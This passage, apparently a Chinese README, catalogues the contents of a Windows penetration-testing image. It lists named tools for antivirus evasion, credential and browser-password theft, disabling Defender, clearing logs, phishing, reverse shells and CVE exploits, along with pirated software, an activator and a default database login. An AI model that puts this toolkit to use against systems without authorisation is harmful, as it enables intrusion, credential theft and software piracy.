title="免责声明:"></a><strong>免责声明:</strong></h1><ol><li><strong>本镜像仅面向合法授权的企业安全建设行为，如您需要测试本镜像的可用性，请自行搭建靶机环境；</strong></li><li><strong>在使用本镜像进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权；</strong></li><li><strong>如您在使用本镜像的过程中存在任何非法行为，您需自行承担相应后果，作者将不承担任何法律及连带责任；</strong></li><li><strong>本镜像所使用的工具资源均来自于网友投稿及互联网整理，作者仅提供分享交流平台，不为其版权负责。如果您发现本镜像中有侵犯您（或贵司）知识产权的资源，请及时反馈，作者会第一时间进行修改或删除。</strong></li></ol><h1 id="软件及工具介绍"><a href="#软件及工具介绍" class="headerlink" title="软件及工具介绍:"></a><strong>软件及工具介绍:</strong></h1><h2 id="系统环境类"><a href="#系统环境类" class="headerlink" title="系统环境类:"></a><strong>系统环境类:</strong></h2><ol><li><strong>Directx</strong></li><li><strong>Net Framework 3.5</strong></li><li><strong>Net Framework 4.8</strong></li><li><strong>Microsoft C runtime library</strong></li><li><strong>Microsoft visual C++ 2005-2022</strong></li><li><strong>集成常用字库</strong></li></ol><h2 id="WindowsApp类"><a href="#WindowsApp类" class="headerlink" title="WindowsApp类:"></a><strong>WindowsApp类:</strong></h2><ol><li><strong>WSL Kali Linux</strong></li><li><strong>Windows Terminal（已替换默认cmd）</strong></li></ol><h2 id="其他工具类-（C-Softwares）"><a href="#其他工具类-（C-Softwares）" class="headerlink" title="其他工具类 （C:\Softwares）:"></a><strong>其他工具类 （C:\Softwares）:</strong></h2><ol><li><strong>AAct:激活工具（激活windows &amp; office）</strong></li><li><strong>Bandicam:视频录制工具（注册版）</strong></li><li><strong>Bandizip:压缩工具（注册版）</strong></li><li><strong>Chrome:108.0.5359 绿色修改版</strong></li></ol><ul><li><strong>主要集成插件:</strong></li><li><strong>Adblock:广告拦截工具</strong></li><li><strong>Charset:修改网页编码工具</strong></li><li><strong>Chrome清理大师:chrome清理工具</strong></li><li><strong>Editthiscookie:cookie编辑工具</strong></li><li><strong>FindSomething:敏感文件搜集工具</strong></li><li><strong>Fofa view:fofa工具</strong></li><li><strong>Funnel search:google搜索工具</strong></li><li><strong>Hackbar</strong></li><li><strong>Hack-Tools:红队综合小工具</strong></li><li><strong>Heimdallr:指纹识别、蜜罐特征告警工具</strong></li><li><strong>IE Tab:ie兼容模式工具</strong></li><li><strong>Infinity:标签页工具</strong></li><li><strong>IP address and domain inf:ip&amp;domain探测工具</strong></li><li><strong>IP whois:whois 探测工具</strong></li><li><strong>Neater bookmarks:书签管理工具</strong></li><li><strong>Octotree:github资源树查看工具</strong></li><li><strong>Onetab:标签管理工具</strong></li><li><strong>Penetration Testing Kit:红队综合小工具</strong></li><li><strong>Postwoman:接口调试工具</strong></li><li><strong>Proxy switchyomega:代理切换工具</strong></li><li><strong>Seoquake:网页统计工具</strong></li><li><strong>Supercopy:超级复制</strong></li><li><strong>Tampermonkey:脚本工具</strong></li><li><strong>User-Agent Switcher:浏览头切换工具</strong></li><li><strong>Toolbox 常用工具:集成常用小工具</strong></li><li><strong>Vulners Web Scanner:微型漏洞扫描工具</strong></li><li><strong>Wappalyzer:网页技术分析工具</strong></li><li><strong>WebSocket Test Client:websocket工具</strong></li><li><strong>Whatruns:网页技术分析工具</strong></li><li><strong>XSS辅助工具</strong></li><li><strong>X情报查询助手:微步社区</strong></li><li><strong>YetAnotherDragAndGo:超链接拖拽新窗口打开</strong></li><li><strong>ZoomEye Tools</strong></li><li><strong>类似的网站</strong></li></ul><ol><li><strong>Contextmenumanager:右键菜单管理工具</strong></li><li><strong>Dism++:系统调节工具</strong></li><li><strong>Everything:搜索工具（已禁用windows自带搜索）</strong></li><li><strong>Goldwave:音频编辑工具</strong></li><li><strong>GoogleEarth:谷歌地球</strong></li><li><strong>Honeyview:看图工具</strong></li><li><strong>Huorong:杀毒工具（C:\Penetration 为白名单）</strong></li><li><strong>ICON:第三方图标包</strong></li><li><strong>Internet Download Manager:6.41.6（注册版）</strong></li><li><strong>IOBit:</strong></li></ol><ul><li><strong>AdvancedSystemcare:优化清理工具（注册版）</strong></li><li><strong>DriverBooster:驱动工具（注册版）</strong></li><li><strong>SmartDefrag:磁盘整理工具（注册版）</strong></li><li><strong>Uninstaller:卸载工具（注册版）</strong></li></ul><ol><li><strong>Mactype:字体管理工具（已修改系统默认字体为Mac苹方体）</strong></li><li><strong>Maye:快捷启动工具</strong></li><li><strong>Meitu:美图秀秀</strong></li><li><strong>OldNewExplorer:资源管理器调节工具</strong></li><li><strong>PCMaster:系统调整工具</strong></li></ol><ul><li><strong>已创建右键快捷菜单:</strong></li><li><strong>在此处打开Terminal终端</strong></li><li><strong>在此处打开KaliLinux终端</strong></li><li><strong>在此处打开Notepad</strong></li><li><strong>控制面板</strong></li><li><strong>计算器</strong></li><li><strong>注册表</strong></li></ul><ol><li><strong>Potplayer:视频播放工具</strong></li><li><strong>Refresh:刷新图标缓存</strong></li><li><strong>Snipaste:截图工具</strong></li><li><strong>Telegram:电报客户端</strong></li><li><strong>UltraISO:iso编辑工具</strong></li><li><strong>WPS:WPS（注册版）</strong></li></ol><h2 id="渗透测试类（C-Penetration）"><a href="#渗透测试类（C-Penetration）" class="headerlink" title="渗透测试类（C:\Penetration）:"></a><strong>渗透测试类（C:\Penetration）:</strong></h2><ol><li><strong>常用的python、C#及java类工具均配有start.bat或start.vbs。</strong></li><li><strong>注明工具版本及更新时间；</strong></li><li><strong>注明依赖环境；</strong></li><li><strong>注明主要参数；</strong></li><li><strong>注明简要用法（给工具不给用法的都是耍流氓）</strong></li></ol><h3 id="安卓工具"><a href="#安卓工具" class="headerlink" title="[+] 安卓工具:"></a><strong>[+] 安卓工具:</strong></h3><ol><li><strong>AndroidHelper:apk逆向工具</strong></li><li><strong>AndroidKiller:apk综合工具</strong></li><li><strong><a href="https://github.com/bihe0832/Android-GetAPKInfo">Apkinfo</a>:apk分析工具</strong></li><li><strong><a href="https://github.com/iBotPeaches/Apktool">Apktool</a>:apk反编译工具</strong></li><li><strong>ApkToolbox:apk综合工具</strong></li><li><strong><a href="https://github.com/linchaolong/ApkToolPlus">ApkToolPlus</a>:apk反编译分析工具</strong></li><li><strong><a href="https://github.com/sulab999/AppMessenger">AppMessenger</a>:apk分析工具</strong></li><li><strong><a href="https://github.com/pxb1988/dex2jar">Dex2jar</a>:dex打包工具</strong></li><li><strong>Nox:夜神安卓模拟器（安卓9.0）</strong></li></ol><ul><li><strong>已安装:</strong></li><li><strong>Debug Proxy</strong></li><li><strong>HttpCanary</strong></li><li><strong>JuiceSSH</strong></li><li><strong>MT</strong></li><li><strong>Net Capture</strong></li><li><strong>NP</strong></li><li><strong>Packet Capture</strong></li><li><strong>ProxyDroid</strong></li><li><strong>Terminal Emulator</strong></li><li><strong>开发者助手</strong></li></ul><ol><li><strong><a href="https://www.vegabird.com/yaazhini/">Yaazhini</a>:apk漏洞扫描工具</strong></li></ol><h3 id="免杀工具"><a href="#免杀工具" class="headerlink" title="[+] 免杀工具:"></a><strong>[+] 免杀工具:</strong></h3><ol><li><strong><a href="https://github.com/piiperxyz/AniYa">Aniya</a></strong></li><li><strong><a href="https://github.com/1y0n/av_evasion_tool">AVevasion</a></strong></li><li><strong>Bypass-antivirus:免杀教程</strong></li><li><strong><a href="https://github.com/9emin1/charlotte">Charlotte</a></strong></li><li><strong><a href="https://github.com/ed1s0nz/cool">Cool</a></strong></li><li><strong><a href="https://github.com/bats3c/darkarmour">DarkArmour</a></strong></li><li><strong><a href="https://github.com/INotGreen/Gllloader">GLLloader</a></strong></li><li><strong><a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a></strong></li><li><strong><a href="https://github.com/Avienma/shellcode_loader">Loader</a></strong></li><li><strong><a href="https://github.com/H4de5-7/powershell-obfuscation">Powershell-Obfuscation</a></strong></li><li><strong>Sandboxie:沙盒工具</strong></li><li><strong><a href="https://github.com/knownsec/shellcodeloader">ShellcodeLoader</a></strong></li><li><strong>VMProtect:加壳工具</strong></li><li><strong>VProtect:加壳工具</strong></li><li><strong><a href="https://github.com/yqcs/ZheTian">ZheTian</a>:遮天shellcode加载工具</strong></li></ol><h3 id="连接工具"><a href="#连接工具" class="headerlink" title="[+] 连接工具:"></a><strong>[+] 连接工具:</strong></h3><ol><li><strong>Anydesk</strong></li><li><strong>Filezilla</strong></li><li><strong>Finalshell</strong></li><li><strong>MobaXterm</strong></li><li><strong>Putty</strong></li><li><strong>Teamviewer</strong></li><li><strong>WinSCP</strong></li><li><strong>Xmanager</strong></li></ol><h3 id="破解工具"><a href="#破解工具" class="headerlink" title="[+] 破解工具:"></a><strong>[+] 破解工具:</strong></h3><ol><li><strong>AccessCrack:access密码破解工具</strong></li><li><strong>Advanced Archive Password Recovery:压缩包密码破解工具</strong></li><li><strong>Advanced Office Password Recovery:office密码破解工具</strong></li><li><strong>Advanced PDF Password Recovery:pdf密码破解工具</strong></li><li><strong>DecryptPassword</strong></li></ol><ul><li><strong>文件夹下集成下列密码破解工具:</strong></li><li><strong><a href="https://github.com/passer-W/FinalShell-Decoder">finalshell-decoder</a></strong></li><li><strong><a href="https://github.com/qurikuduo/finalshellPasswordDecoder">finalshellPasswordDecoder</a></strong></li><li><strong><a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a></strong></li><li><strong><a href="https://github.com/LimerBoy/FireFox-Thief">FireFox-Thief</a></strong></li><li><strong><a href="https://github.com/moonD4rk/HackBrowserData">hack-browser-data-windows</a></strong></li><li><strong><a href="https://github.com/HyperSine/how-does-navicat-encrypt-password">how-does-navicat-encrypt-password</a></strong></li><li><strong><a href="https://github.com/HyperSine/how-does-SecureCRT-encrypt-password">how-does-SecureCRT-encrypt-password</a></strong></li><li><strong><a href="https://github.com/HyperSine/how-does-Xmanager-encrypt-password">how-does-Xmanager-encrypt-password</a></strong></li><li><strong>Safe360Browsergetpass</strong></li><li><strong><a href="https://github.com/uknowsec/SharpDecryptPwd">SharpDecryptPwd</a></strong></li><li><strong><a href="https://github.com/attackercan/teamviewer-dumper">teamviewer-dumper</a></strong></li><li><strong>vcenterExsi_PwdDecrypt</strong></li><li><strong><a href="https://github.com/anoopengineer/winscppasswd">winscppasswd</a></strong></li></ul><ol><li><strong><a href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a>:口令爆破工具</strong></li><li><strong>MD5Crack:md5碰撞工具</strong></li><li><strong>SNETCracker:超级弱口令破解工具</strong></li><li><strong>WebshellCrack:一句话密码破解工具</strong></li></ol><ul><li><strong>K8_FuckOneShell</strong></li><li><strong>K8_OneShellCrack</strong></li><li><strong>T00ls综合一句话爆破工具</strong></li></ul><h3 id="数据工具"><a href="#数据工具" class="headerlink" title="[+] 数据工具:"></a><strong>[+] 数据工具:</strong></h3><ol><li><strong>AnotherRedisDesktopManager:redis管理工具</strong></li><li><strong>DatabaseBrowser:mdb &amp; xls数据库查看工具</strong></li><li><strong>DatabaseUtilizationTools:数据库利用工具</strong></li><li><strong>HeidiSQL:数据库连接管理工具</strong></li><li><strong>Microsoft SQL Server:2019专业版</strong></li></ol><ul><li><strong>username:sa</strong></li><li><strong>password:sqladmin</strong></li></ul><ol><li><strong>Microsoft SQL Server Management:mssql连接工具</strong></li><li><strong>Navicat:数据库连接管理工具</strong></li><li><strong>Neo4j:neo4j数据库管理工具</strong></li><li><strong>OracleShell:oracle利用工具</strong></li><li><strong>RedisDesktopManager:redis管理工具</strong></li><li><strong>SharpSqlTools:mssql数据库利用工具</strong></li><li><strong>Sqlite:sqlite数据库管理工具</strong></li><li><strong>Sqlknife:mssql数据库利用工具</strong></li><li><strong>Sqlmap:注入工具</strong></li><li><strong>SQLTools:mssql利用工具</strong></li><li><strong>Sylas:mssql &amp; orcle &amp; postgresql数据库利用工具</strong></li><li><strong>ToadOracle:oracle数据库管理工具</strong></li></ol><h3 id="夺旗工具（CTF）"><a href="#夺旗工具（CTF）" class="headerlink" title="[+] 夺旗工具（CTF）:"></a><strong>[+] 夺旗工具（CTF）:</strong></h3><ol><li><strong>ASCII</strong></li><li><strong>BehinderDecode</strong></li><li><strong>BerylEnigma</strong></li><li><strong>Binwalk</strong></li><li><strong>BlindWatermark</strong></li><li><strong>CaptfEncoder</strong></li><li><strong>Converter</strong></li><li><strong>CRCCalculator</strong></li><li><strong>CTFEditor</strong></li><li><strong>CTFTools</strong></li><li><strong>CTFcrack</strong></li><li><strong>CyberChef</strong></li><li><strong>DesTool</strong></li><li><strong>F5Steganography</strong></li><li><strong>FindFlag</strong></li><li><strong>Foremost</strong></li><li><strong>GifTools</strong></li><li><strong>GNUplot</strong></li><li><strong>JPHS</strong></li><li><strong>MossTool</strong></li><li><strong>LSBSteganography</strong></li><li><strong>MP3Steno</strong></li><li><strong>NamoGif Animator</strong></li><li><strong>Outguess</strong></li><li><strong>PcapTool</strong></li><li><strong>PixRecovery</strong></li><li><strong>PNGCalculator</strong></li><li><strong>PNGCheck</strong></li><li><strong>PNGDebugger</strong></li><li><strong>QRResearch</strong></li><li><strong>QRCode</strong></li><li><strong>Regular</strong></li><li><strong>RSATool</strong></li><li><strong>RSA_N</strong></li><li><strong>SM4</strong></li><li><strong>Steganography</strong></li><li><strong>Stegdetect</strong></li><li><strong>Steghide</strong></li><li><strong>Stegsolve</strong></li><li><strong>Taowa Tool</strong></li><li><strong>Tweak PNG</strong></li><li><strong>Volatility</strong></li><li><strong>Volatility Workbench</strong></li><li><strong>wbStego</strong></li><li><strong>WinHex</strong></li><li><strong>Xiaokui</strong></li><li><strong>ZZYQR</strong></li><li><strong>ctf 密码学知识点总结</strong></li><li><strong>ctf 逆向知识点总结</strong></li><li><strong>ctf 隐写术知识点总结</strong></li></ol><h3 id="字典工具"><a href="#字典工具" class="headerlink" title="[+] 字典工具:"></a><strong>[+] 字典工具:</strong></h3><ol><li><strong>DictMaker:字典生成工具</strong></li></ol><ul><li><strong><a href="https://github.com/ort4u/PwdBUD">PwdBUD</a></strong></li><li><strong>黑刀字典生成工具</strong></li><li><strong>火花字典生成工具</strong></li><li><strong>木头字典生成工具</strong></li><li><strong>品轩字典生成工具</strong></li><li><strong>易优字典生成工具</strong></li></ul><ol><li><strong><a href="https://github.com/TheKingOfDuck/fuzzDicts">fuzzDicts</a></strong></li><li><strong><a href="https://github.com/ppbibo/pentesterspecialdict">pentestdicts</a></strong></li></ol><h3 id="磁盘工具"><a href="#磁盘工具" class="headerlink" title="[+] 磁盘工具:"></a><strong>[+] 磁盘工具:</strong></h3><ol><li><strong>Diskgenius:注册版（可恢复硬盘数据）</strong></li><li><strong>SSDfresh:ssd优化工具</strong></li></ol><h3 id="编辑工具"><a href="#编辑工具" class="headerlink" title="[+] 编辑工具:"></a><strong>[+] 编辑工具:</strong></h3><ol><li><strong>010Editor:十六进制编辑工具（注册版）</strong></li><li><strong>BeyondCompare:文件对比工具</strong></li><li><strong>eSearch:截屏、录屏、OCR、搜索、翻译、贴图、以图搜图（已集成离线OCR库）</strong></li><li><strong>FFRename:菲菲更名宝贝（专业版）</strong></li><li><strong>FindStr:文本检索工具</strong></li><li><strong><a href="https://github.com/MountCloud/FireKylin">FireKylin</a>:系统痕迹采集</strong></li><li><strong>Fortify:代码审计工具22.1.0（已集成rules）（注册版）</strong></li><li><strong>JavaDecompiler:java查看编辑工具</strong></li><li><strong>Jsonview:json查看编辑工具</strong></li><li><strong>LogParse:windows日志分析工具</strong></li><li><strong>LogParseLizard:windows日志分析工具（图形化）</strong></li><li><strong>myBase:个人数据库编辑工具（注册版）</strong></li><li><strong>Notepad++:编辑工具</strong></li><li><strong>PSTConverter:pst邮件转换工具</strong></li><li><strong>Seay:php代码审计工具</strong></li><li><strong>SeayDzend:php zend解密工具</strong></li><li><strong>SharpSword:csharp版本word查看工具</strong></li><li><strong>Sublime:编辑工具（注册版）</strong></li><li><strong>Typora:MarkDown编辑工具（注册版）</strong></li><li><strong>VSCode:VisualCode编辑工具</strong></li><li><strong>WindowsLogsAnalysis:windows日志分析工具（图形化）</strong></li><li><strong>XMind:思维导图工具</strong></li><li><strong>YoudaoDict:有道词典（注册版）（已集成离线翻译库）</strong></li></ol><h3 id="漏洞工具"><a href="#漏洞工具" class="headerlink" title="[+] 漏洞工具:"></a><strong>[+] 漏洞工具:</strong></h3><ol><li><strong>AlibabaNacos</strong></li><li><strong>Apache</strong></li><li><strong>Cacti</strong></li><li><strong>Cas</strong></li><li><strong>Chrome</strong></li><li><strong>Citrix</strong></li><li><strong>CMSHunter</strong></li><li><strong>Confluence</strong></li><li><strong>D-Link</strong></li><li><strong>Database</strong></li></ol><ul><li><strong>mongo</strong></li><li><strong>mssql</strong></li><li><strong>mysql</strong></li><li><strong>redis</strong></li></ul><ol><li><strong>Elasticsearch</strong></li><li><strong>F5-BIG-IP</strong></li><li><strong>FastAdmin</strong></li><li><strong>Fastjson</strong></li><li><strong>FCKEditor</strong></li><li><strong>FusionAuth</strong></li><li><strong>Gitlab</strong></li><li><strong>Harbor</strong></li><li><strong>HTTPBasic</strong></li><li><strong>HTTPFileServer</strong></li><li><strong>IIS</strong></li><li><strong>ILO4</strong></li><li><strong>Intellian-Aptus-Web</strong></li><li><strong>Jboss</strong></li><li><strong>Jellyfin</strong></li><li><strong>Jenkins</strong></li><li><strong>Jira</strong></li><li><strong>JumpServer</strong></li><li><strong>Kibana</strong></li><li><strong>Liferay</strong></li><li><strong>Linux</strong></li></ol><ul><li><strong>CVE-2015-1328</strong></li><li><strong>CVE-2019-14287</strong></li><li><strong>CVE-2021-22555</strong></li><li><strong>CVE-2021-3156</strong></li><li><strong>CVE-2021-33909</strong></li><li><strong>CVE-2021-3493</strong></li><li><strong>CVE-2021-4034</strong></li><li><strong>CVE-2022-0847-1</strong></li><li><strong>CVE-2022-0847-2</strong></li><li><strong>CVE-2022-23222</strong></li><li><strong>…</strong></li></ul><ol><li><strong>Mail</strong></li></ol><ul><li><strong>coremail</strong></li><li><strong>exchange</strong></li><li><strong>zimbra</strong></li></ul><ol><li><strong>MetaCRM</strong></li><li><strong>ModSecurity</strong></li><li><strong>Nexus</strong></li><li><strong>Node.js</strong></li><li><strong>OA</strong></li></ol><ul><li><strong>seeyon</strong></li><li><strong>tongda</strong></li><li><strong>weaver</strong></li></ul><ol><li><strong>Office</strong></li><li><strong>Open-AudIT</strong></li><li><strong>Others</strong></li><li><strong>PHP-FPM</strong></li><li><strong>PHP</strong></li><li><strong>phpMyadmin</strong></li><li><strong>PHPStudy</strong></li><li><strong>Rconfig</strong></li><li><strong>SaltStack</strong></li><li><strong>Sangfor</strong></li><li><strong>SAP</strong></li><li><strong>Shiro</strong></li><li><strong>ShowDoc</strong></li><li><strong>Solarwinds</strong></li><li><strong>Spring</strong></li><li><strong>Struts2</strong></li><li><strong>Sunlogin</strong></li><li><strong>TeamViewer</strong></li><li><strong>Tomcat</strong></li><li><strong>Tools</strong></li></ol><ul><li><strong>AliyunAKTools:阿里云利用工具</strong></li><li><strong>AptTools:综合漏洞利用工具</strong></li><li><strong><a href="https://github.com/teamssix/cf">CF</a>:云环境利用框架</strong></li><li><strong><a href="https://github.com/codeyso/CodeTest">CodeTest</a>:综合漏洞利用工具</strong></li><li><strong>docs-0sec:零组文档库</strong></li><li><strong>docs-base:漏洞文档库</strong></li><li><strong><a href="https://github.com/almandin/fuxploider">Fuxploider</a>:漏洞扫描工具</strong></li><li><strong><a href="https://github.com/lijiaxing1997/Gr33k">Gr33k</a>:综合漏洞利用工具</strong></li><li><strong><del>HVVExploitApply:寻云安全团队1.5 综合漏洞利用工具（未取得授权，特此删除）</del></strong></li><li><strong>LiqunKit:综合漏洞利用工具</strong></li><li><strong><a href="https://github.com/achuna33/MYExploit">MYExploit</a>:综合漏洞利用工具</strong></li><li><strong><a href="https://github.com/Thdub/NSudo_Installer">NSudoLG</a>:windows提权工具</strong></li><li><strong><a href="https://github.com/projectdiscovery/nuclei">Nuclei</a>:内网扫描工具</strong></li><li><strong>OATools:OA漏洞利用工具</strong></li><li><strong><a href="https://github.com/tr0uble-mAker/POC-bomber">POCbomber</a>:综合漏洞利用工具</strong></li><li><strong><a href="https://github.com/f0ng/poc2jar">poc2jar</a>:综合漏洞利用工具</strong></li><li><strong><a href="https://github.com/thelostworldFree/Ruoyi-All">Ruoyi-All</a>:综合漏洞利用工具</strong></li><li><strong><a href="https://github.com/yhy0/ExpDemo-JavaFX">Shenji</a>:综合漏洞利用工具</strong></li><li><strong><a href="https://github.com/4ra1n/super-xray">SuperXray</a>:综合漏洞利用工具</strong></li><li><strong><a href="https://github.com/zhzyker/vulmap">Vulmap</a>:综合漏洞利用工具</strong></li><li><strong><a href="https://github.com/bitsadmin/wesng">WinExpSuggester-NG</a>:windows提权工具</strong></li><li><strong><a href="https://github.com/0xToast/Windows-Exploit-Suggester-Py-3">WinExpSuggester</a>:windows提权工具</strong></li><li><strong><a href="https://github.com/chaitin/xray">Xray</a>:漏洞扫描工具</strong></li><li><strong>Ysoserial</strong></li></ul><ol><li><strong>TPLink</strong></li><li><strong>VMware</strong></li><li><strong>Weblogic</strong></li><li><strong>Webmin</strong></li><li><strong>Windows</strong></li></ol><ul><li><strong>CVE-2003-0352</strong></li><li><strong>CVE-2005-1983</strong></li><li><strong>CVE-2006-3439</strong></li><li><strong>CVE-2008-1084</strong></li><li><strong>…</strong></li><li><strong>CVE-2021-42287</strong></li><li><strong>CVE-2022-21907</strong></li><li><strong>CVE-2022-26923</strong></li><li><strong>…</strong></li><li><strong>MS03-026</strong></li><li><strong>MS05-039</strong></li><li><strong>MS06-040</strong></li><li><strong>…</strong></li><li><strong>MS17-017</strong></li></ul><ol><li><strong>XenMobile</strong></li><li><strong>XStream</strong></li><li><strong>XXL-job</strong></li><li><strong>Ysuserial</strong></li><li><strong>Zoho</strong></li><li><strong>Zyxel</strong></li></ol><blockquote><p><strong>漏洞库综合了下列项目:</strong></p></blockquote><ul><li><strong><a href="https://github.com/SecWiki/CMS-Hunter">CMSHunter</a></strong></li><li><strong><a href="https://github.com/zhzyker/exphub">expHub</a></strong></li><li><strong><a href="https://github.com/mai-lang-chai/middleware-vulnerability-detection">Middleware-Vulnerability-Detection</a></strong></li><li><strong><a href="https://github.com/mai-lang-chai/system-vulnerability">System-Vulnerability</a></strong></li><li><strong><a href="https://github.com/edgesecurityteam/vulnerability">Vulnerability</a></strong></li></ul><blockquote><p><strong>更多漏洞exp见 C:\Penetration\ExpolitTools（漏洞exp较多，请善用everything搜索）</strong></p></blockquote><h3 id="内网工具"><a href="#内网工具" class="headerlink" title="[+] 内网工具:"></a><strong>[+] 内网工具:</strong></h3><ol><li><strong><a href="https://github.com/3gstudent">3Gstudent</a>:三好学生powershell &amp; python脚本</strong></li><li><strong><a href="https://github.com/nccgroup/ABPTTS">ABPTTS</a>:内网穿透工具</strong></li><li><strong>AddUser:添加用户工具</strong></li><li><strong>ADExplore:ldap工具</strong></li><li><strong><a href="https://github.com/lzzbb/Adinfo">ADinfo</a>:内网信息搜集工具</strong></li><li><strong><a href="https://github.com/PinoyWH1Z/AoratosWin">Aoratos</a>:软件运行痕迹清理工具</strong></li><li><strong>BloodHound:域渗透分析工具</strong></li><li><strong>BloudyAD:域渗透利用工具</strong></li><li><strong>BruteLogon:windows口令爆破工具</strong></li><li><strong>ClearLogs:windows日志清除工具</strong></li><li><strong><a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec</a>:内网综合利用工具</strong></li><li><strong><a href="https://github.com/Back-X/Defeat-Defender">DefeatDefender</a>:关闭defender工具</strong></li><li><strong><a href="https://github.com/SkewwG/domainTools">DomainTools</a>:域渗透综合利用工具</strong></li><li><strong><a href="https://github.com/wangfly-me/DomainInfo_Find">DomainInfoFind</a>:获取域内机器的桌面文件</strong></li><li><strong>EarthWorm:内网穿透工具</strong></li><li><strong><a href="https://github.com/fatedier/frp">Frp</a>:内网穿透工具</strong></li><li><strong><a href="https://github.com/shadow1ng/fscan">FScan</a>:内网扫描工具</strong></li><li><strong>GetWinInfo:windows信息搜集工具</strong></li><li><strong>Gorailgun:内网渗透综合利用工具</strong></li></ol><ul><li><strong>password:三个空格</strong></li></ul><ol><li><strong><a href="https://gotohttp.com/">GoToHTTP</a>:远控工具</strong></li><li><strong><a href="https://github.com/t3l3machus/hoaxshell">Hoaxshell</a>:远控工具</strong></li><li><strong><a href="https://github.com/SecureAuthCorp/impacket">impacket</a>:内网协议工具</strong></li><li><strong><a href="https://github.com/EddieIvan01/iox">iox</a>:流量代理工具</strong></li><li><strong>Ladon:内网扫描工具（小密圈9.3版本）</strong></li><li><strong>LCX:端口转发工具</strong></li><li><strong>LdapAdmin:ldap工具</strong></li><li><strong><a href="https://github.com/dirkjanm/ldapdomaindump">LDAPDomainDump</a>:ldap工具</strong></li><li><strong>Mimikatz:密码抓取工具</strong></li></ol><blockquote><p><strong>文件夹下集成下列密码抓取工具</strong></p></blockquote><ul><li><strong><a href="https://github.com/C-Sto/gosecretsdump">gosecretsdump</a></strong></li><li><strong>hklm</strong></li><li><strong><a href="https://github.com/gentilkiwi/kekeo">kekeo</a></strong></li><li><strong><a href="https://github.com/AlessandroZ/LaZagne">lazagne</a></strong></li><li><strong><a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a></strong></li><li><strong><a href="https://github.com/zcgonvh/NTDSDumpEx">ntdsdumpex</a></strong></li><li><strong>procdump</strong></li><li><strong><a href="https://www.openwall.com/passwords/windows-pwdump">pwdump</a></strong></li><li><strong><a href="https://blog.quarkslab.com/quarks-pwdump.html">quarkspwdump</a></strong></li></ul><ol><li><strong><a href="https://github.com/makdosx/mip22">Mip22</a>:网页钓鱼工具</strong></li><li><strong><a href="https://github.com/mufeedvh/moonwalk">Moonwalk</a>:linux取证工具</strong></li><li><strong><a href="https://github.com/u21h2/nacs">Nacs</a>:内网扫描工具</strong></li><li><strong>NC:监听工具</strong></li><li><strong><a href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a>:regeorg重构版</strong></li><li><strong><a href="https://github.com/shmilylty/netspy">NetSpy</a>:内网网段探测工具</strong></li><li><strong><a href="https://github.com/ehang-io/nps">NPS</a>:内网代理工具</strong></li><li><strong>OpenRDP:开启远程桌面工具</strong></li><li><strong>OpenSSH:ssh工具</strong></li><li><strong>Pack:打包工具</strong></li></ol><ul><li><strong>7z（单文件版）</strong></li></ul><ol><li><strong><a href="https://www.wepe.com.cn/">PE</a>:WeiPE镜像</strong></li><li><strong><a href="https://github.com/carlospolop/PEASS-ng">PEASS-ng</a>:linux取证工具</strong></li><li><strong><a href="https://github.com/get-get-get-get/PowerProxy">PowerProxy</a>:powershell代理工具</strong></li><li><strong><a href="https://github.com/p3nt4/PowerShdll">PowershDLL</a>:powershell工具</strong></li><li><strong>PS2EXE:powershell转exe工具</strong></li><li><strong><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/pstools">PSTools</a>:微软psexec工具</strong></li><li><strong><a href="https://github.com/FunnyWolf/pystinger">PyStinger</a>:流量代理工具</strong></li><li><strong>ReverseShell:反弹shell工具</strong></li><li><strong><a href="https://github.com/emptymonkey/revsh">revsh</a>:内网穿透工具</strong></li><li><strong><a href="https://github.com/hktalent/scan4all">Scan4all</a>:内网扫描工具</strong></li><li><strong><a href="https://github.com/netero1010/ScheduleRunner">ScheduleRunner</a>:计划任务利用工具</strong></li><li><strong>SharpTools:</strong></li></ol><ul><li><strong>CatchBrowser:浏览器密码抓取工具</strong></li><li><strong><a href="https://github.com/b4rtik/SharpAdidnsdump">SharpAdiDnsDump</a>:域dns枚举工具</strong></li><li><strong><a href="https://github.com/RowTeam/SharpDecryptPwd">SharpDecryptPwd</a>:浏览器密码解密工具</strong></li><li><strong><a href="https://github.com/uknowsec/SharpEventLog">SharpEventLog</a>:日志分析工具</strong></li><li><strong><a href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a>:域渗透分析工具</strong></li><li><strong>SharpListRDPConnections:rdp连接记录枚举工具</strong></li><li><strong><a href="https://github.com/uknowsec/SharpNetCheck">SharpNetCheck</a>:出网探测工具</strong></li><li><strong><a href="https://github.com/Adminisme/SharpRDPLog">SharpRDPLog</a>:rdp连接记录枚举工具</strong></li><li><strong><a href="https://github.com/iomoath/SharpStrike">SharpStrike</a>:cobaltstrike工具</strong></li><li><strong><a href="https://github.com/AdminTest0/SharpWxDump">SharpWxDump</a>:微信解密工具</strong></li></ul><ol><li><strong><a href="https://github.com/lab52io/StopDefender">StopDefender</a>:关闭defender工具</strong></li><li><strong><a href="https://github.com/ph4ntonn/Stowaway">Stowaway</a>:内网穿透工具</strong></li><li><strong><a href="https://github.com/inbug-team/SweetBabyScan">SweetBabyScan</a>:内网扫描工具</strong></li><li><strong><a href="https://github.com/liamg/traitor">Traitor</a>:linux提权工具</strong></li><li><strong><a href="https://github.com/returnvar/wce">WCE</a>:windows凭证编辑工具</strong></li><li><strong>Wget:下载工具</strong></li><li><strong><a href="https://github.com/rootclay/WMIHACKER">wmiHacker</a>:wmi渗透工具</strong></li></ol><blockquote><p><strong>更多内网工具见 C:\Penetration\IntranetTools</strong></p></blockquote><h3 id="办公工具"><a href="#办公工具" class="headerlink" title="[+] 办公工具:"></a><strong>[+] 办公工具:</strong></h3><ol><li><strong>Adobe Acrobat DC 2022:PDF编辑工具</strong></li><li><strong>Office:Word + Excel + Powerpoint + Access + Onenote + Outlook</strong></li><li><strong>WPS:Word + Excel + Powerpoint + PDF</strong></li></ol><h3 id="编程工具"><a href="#编程工具" class="headerlink" title="[+] 编程工具:"></a><strong>[+] 